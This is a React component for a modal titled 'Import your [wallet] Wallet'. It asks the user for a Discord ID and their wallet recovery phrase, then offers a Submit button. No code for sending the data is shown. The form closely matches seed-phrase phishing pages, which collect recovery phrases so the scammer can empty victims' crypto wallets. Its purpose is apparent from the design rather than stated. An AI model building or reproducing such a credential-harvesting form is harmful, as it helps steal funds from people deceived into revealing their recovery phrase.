import React from "react";

// REACT BOOTSTRAP
import { Modal, Button, Form, InputGroup, FormControl } from "react-bootstrap";

// ICONS
import { FaDiscord } from "react-icons/fa";
import { AiFillSecurityScan } from "react-icons/ai";

export default function WalletModal(props) {
  const { show, handleClose, walletname, walletnameImg } = props;
  return (
    <>
      <Modal show={show} onHide={handleClose} centered>
        {/* HEADER */}
        <Modal.Header closeButton>
          <Modal.Title>
            <div className="modal_title">
              {" "}
              <img
                src={walletnameImg}
                alt="Wallet Icons"
                height={40}
                width={40}
                className="img_wallet"
              />
              {"Import your "}
              {walletname}
              {" Wallet"}
            </div>
          </Modal.Title>
        </Modal.Header>
        {/* BODY */}
        <Modal.Body>
          <Form>
            {/* DISCORD */}
            <Form.Label>Discord ID:</Form.Label>
            <InputGroup className="mb-3">
              <InputGroup.Text id="basic-addon1">
                <FaDiscord />
              </InputGroup.Text>
              <FormControl
                placeholder="Enter your discord ID"
                aria-label="Enter your discord ID"
                aria-describedby="basic-addon1"
              />
            </InputGroup>
            {/* RECOVERY PHRASE */}
            <Form.Label>Recovery Phrase:</Form.Label>
            <InputGroup className="mb-3">
              <InputGroup.Text id="basic-addon1">
                <AiFillSecurityScan />
              </InputGroup.Text>
              <FormControl
                data-toggle="tooltip"
                data-placement="top"
                title="Typically 12 words separated by single spaces"
                as="textarea"
                placeholder="Enter your recovery phrase"
                aria-label="Enter your recovery phrase"
                aria-describedby="basic-addon1"
              />
            </InputGroup>
            <Button variant="primary" type="submit">
              Submit
            </Button>
          </Form>
        </Modal.Body>
      </Modal>
    </>
  );
}
